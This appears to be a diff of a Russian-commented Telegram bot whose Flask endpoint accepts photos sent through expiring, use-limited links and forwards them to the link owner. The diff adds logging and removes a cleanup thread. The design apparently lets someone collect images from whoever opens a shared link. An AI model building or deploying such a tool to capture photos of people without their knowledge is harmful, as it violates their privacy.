@@ -14,27 +14,22 @@ from datetime import datetime, timedelta
 # ========== НАСТРОЙКИ (из переменных окружения) ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 if not BOT_TOKEN:
-    raise ValueError("BOT_TOKEN not set! Add to environment variables.")
+    raise ValueError("BOT_TOKEN not set!")
 
 BOT_USERNAME = os.environ.get('BOT_USERNAME', 'genphototikbot')
 MAX_USES = int(os.environ.get('MAX_USES', 3))
 ADMIN_ID = int(os.environ.get('ADMIN_ID', 957881887))
-
-# Подключение к базе данных
 DATABASE_URL = os.environ.get('DATABASE_URL')
 # =========================================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
-active_links = {}
 app = Flask(__name__)
 
 # ========== РАБОТА С БАЗОЙ ДАННЫХ ==========
 def init_db():
-    """Создание таблиц при первом запуске"""
     if not DATABASE_URL:
-        print("⚠️ DATABASE_URL not set, skipping database init")
+        print("⚠️ DATABASE_URL not set")
         return
-    
     conn = psycopg2.connect(DATABASE_URL)
     cur = conn.cursor()
     
@@ -249,7 +244,6 @@ def update_link_uses(code, uses):
     cur.close()
     conn.close()
 
-# Инициализация базы данных
 if DATABASE_URL:
     init_db()
 else:
@@ -404,16 +398,21 @@ def receive_photo():
     link_code = data.get('code')
     photo_data = data.get('photo')
     
+    print(f"📸 Получен код: {link_code}")
+    
     link_info = get_link(link_code)
     
     if not link_info:
+        print(f"❌ Ссылка {link_code} не найдена в БД")
         return jsonify({'success': False, 'error': 'not_found'}), 400
     
     if datetime.now() > link_info['expires_at']:
+        print(f"⏰ Ссылка {link_code} истекла")
         delete_link(link_code)
         return jsonify({'success': False, 'error': 'expired'}), 400
     
     if link_info['uses'] >= link_info['max_uses']:
+        print(f"📊 Ссылка {link_code} лимит использован")
         return jsonify({'success': False, 'error': 'limit_reached'}), 400
     
     chat_id = link_info['owner_id']
@@ -423,7 +422,7 @@ def receive_photo():
     photo_data = re.sub('^data:image/.+;base64,', '', photo_data)
     photo_bytes = base64.b64decode(photo_data)
     
-    temp_path = f'photo_{int(time.time())}.jpg'
+    temp_path = f'/tmp/photo_{int(time.time())}.jpg'
     with open(temp_path, 'wb') as f:
         f.write(photo_bytes)
     
@@ -434,6 +433,7 @@ def receive_photo():
     if new_uses >= link_info['max_uses']:
         delete_link(link_code)
     
+    print(f"✅ Фото отправлено для кода {link_code}")
     return jsonify({'success': True})
 
 def is_allowed(user_id):
@@ -518,12 +518,6 @@ def handle_callback(call):
             disable_web_page_preview=True
         )
         
-        def delete_link_task():
-            time.sleep(600)
-            if get_link(code):
-                delete_link(code)
-        
-        threading.Thread(target=delete_link_task, daemon=True).start()
         bot.answer_callback_query(call.id)
     
     elif call.data.startswith('allow_'):
